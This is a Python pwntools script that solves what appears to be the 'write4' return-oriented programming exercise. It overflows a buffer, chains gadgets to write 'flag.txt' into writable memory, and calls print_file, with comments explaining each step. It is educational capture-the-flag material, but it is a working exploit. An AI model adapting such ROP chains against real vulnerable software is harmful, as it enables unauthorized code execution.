#!/usr/bin/python3
from pwn import *

'''
Curious on how this works?
    -40 bytes of padding to overflow the buffer and overwrite the rbp
    -var flag is the hexadecimal representation of "flag.txt"
    -imported function print_file, based on the example from reversing
    shows that it takes one argument, the file we want to print
    using ropgadget we find all the gadgets we need to create the exploit:
0x00000000004004e6 : ret
0x0000000000400693 : pop rdi ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret

    -for stack alignment we slap a ret in there before the start of our payload
    -pop the values from r14 and r15
    -push the address we want to store the flag string in, push the flag string
    -wait, where did we get this address from?
        checking the values in .got.plt, loc.__data_start is at 0x601028
        so the following address space is empty and we will use that
    -we call the mov gadget
    -push the address where the flag is stored, call print_file

'''

# junk
junk = (b"A"*40)
flag = p64(0x7478742e67616c66) # flag.txt

# plt
print_file = p64(0x00400510)

# gadgets 
ret = p64(0x00000000004004e6)
pop_rdi = p64(0x0000000000400693)
mov_r14_r15 = p64(0x0000000000400628)
pop_r14_r15 = p64(0x0000000000400690)

# payload
payload = junk
payload += ret
payload += pop_r14_r15                  # pop r14; pop r15; ret
payload += p64(0x601040) + flag         # r14 ; r15
payload += mov_r14_r15                  # mov qword ptr [r14], r15; ret
payload += pop_rdi                      # pop rdi ; ret
payload += p64(0x601040) + print_file   # r14 ; sym.imp.print_file

# process
context.binary = binary = ELF("./write4", checksec=False)
p = process()
p.sendline(payload)
p.interactive()
